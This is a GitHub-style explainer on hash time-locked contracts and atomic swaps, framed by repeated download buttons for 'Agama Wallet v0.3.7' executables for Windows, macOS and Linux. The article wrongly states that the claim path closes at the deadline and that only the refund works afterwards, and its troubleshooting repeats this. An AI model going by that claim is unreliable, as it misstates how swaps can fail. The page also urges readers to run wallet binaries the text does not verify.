[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# HTLC Explained: Hash Time-Locked Contracts

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

A hash time-locked contract is a spending condition with two escape routes: reveal a secret that matches a published hash, or wait until a deadline and take the funds back. It is the device that makes an atomic swap atomic, because claiming one side publishes the secret that unlocks the other. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, described by its maker as using these contracts through the BarterDEX protocol.

## You'll see this if

A swap screen mentions a hash, a secret, a lock time or a countdown, and none of those words appear anywhere else in the wallet.

| Term you meet | Plain meaning |
|---|---|
| Hash | A fixed-length fingerprint of the secret, published in advance |
| Preimage or secret | The value that produces that fingerprint |
| Time lock | A block height or time after which the other path opens |
| Lock | A payment to the contract output |
| Claim | Spending the contract output by revealing the secret |
| Refund | Spending it back after the deadline |

## Why it happens

A normal payment has one condition: the right signature. A swap needs a condition that can be satisfied two ways, one of which depends on something the other party does.

The contract encodes both paths in one output:

- **Path one, before the deadline:** whoever presents a value whose hash matches the published hash may spend it. This is the claim.
- **Path two, after the deadline:** whoever holds the original key may spend it back. This is the refund.

The two paths are mutually exclusive in time. Before the deadline only the claim works; after it, the refund works. That ordering is what makes the trade safe without either party trusting the other, and it is why the deadlines on the two chains must differ.

Two practical limits follow from the script capabilities available. First, the time lock must be expressed in something both chains understand, usually a block height, which makes the deadline depend on block production rather than a clock. Second, the contract can only enforce conditions both chains can evaluate, so a swap implementation restricts itself to a hash and a timeout rather than anything more elaborate.

The consequence people miss: revealing the secret to claim is a public act. Anyone watching the chain learns it, which is precisely the mechanism that lets the counterparty claim their leg. It also means the secret is not a password to be protected after the fact; its publication is the point.

## Fix

Reading a contract output is straightforward once you know which path is live.

1. **Find the hash in the transaction.** It is part of the spending condition, visible to anyone.
2. **Find the deadline.** It appears as a block height or a timestamp, depending on the chain's script capabilities.
3. **Decide which path is available now.** Before the deadline, only the claim; after it, only the refund.
4. **Build the matching transaction.** A claim needs the secret; a refund needs nothing beyond the original key and the deadline having passed.
5. **Pay enough fee for the path you are using.** A refund that sits unconfirmed past a reorganisation is a delay, not a loss, but it wastes the window.

The sequence these steps belong to is in [how atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md).

## If that did not work

If a claim is rejected, the secret does not match the hash, or the deadline has passed. Both are checkable before broadcasting.

If a refund is rejected before the deadline, the time lock has not expired in the chain's own terms. Block heights advance unevenly, so compare against the current height rather than a clock.

If a contract output sits unspent long after both deadlines, the parties simply did not act. The funds are still recoverable by the refund path, by whoever holds the key.

If an interface offers to "release" a locked output without a transaction, it is describing something other than this mechanism. Only a transaction moves a contract output.

## Prevention

- **Understand the direction of the deadlines.** The second party's deadline must be later, or the safety window disappears.
- **Keep a fee balance on both chains.** Both paths are transactions.
- **Do not treat the secret as a password.** Its publication is how the trade completes.
- **Record the two deadlines when the swap starts.** They are the only times that matter.
- **Rehearse with test coins.** [Testing swaps on test networks](https://github.com/agama-wallet/atomic-swaps/blob/main/testing-on-signet-and-testnet.md) shows the paths without risk.

## FAQ

### Is an HTLC the same as a multi-signature address?

No. A multi-signature address requires several keys to agree; an HTLC requires either a secret or the passage of time. The two can be combined, but they answer different questions.

### Why does the secret become public?

Because claiming requires publishing the value that hashes to the agreed fingerprint, and that publication is visible on-chain. It is the mechanism, not a leak.

### Can an HTLC hold funds forever?

No. The time-lock path always exists, so a contract output can be reclaimed after the deadline by the party entitled to it.

### What happens if both parties try to claim at once?

Only one claim can succeed. Once the contract output is spent, the second attempt fails because the output no longer exists, which is the same rule that prevents double spending anywhere on the chain. There is no race to win: the first valid claim settles the trade.

### Can an HTLC be used without a swap?

Yes. The pattern of a hash condition plus a timeout is useful for conditional payments in general, such as releasing value when a piece of information is published. A swap is the most common use, not the only one.

### Do all chains support the same HTLC features?

No. Script capabilities differ, which is why swap implementations restrict themselves to the intersection of what both chains can express, usually a hash and a time lock.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [How Atomic Swaps Work, Step by Step](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md)
- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [When an Atomic Swap Fails: Timeouts and Refunds](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md)
- [Cross-Chain Swaps: What They Are and Where They Fail](https://github.com/agama-wallet/atomic-swaps/blob/main/moving-value-between-chains.md)
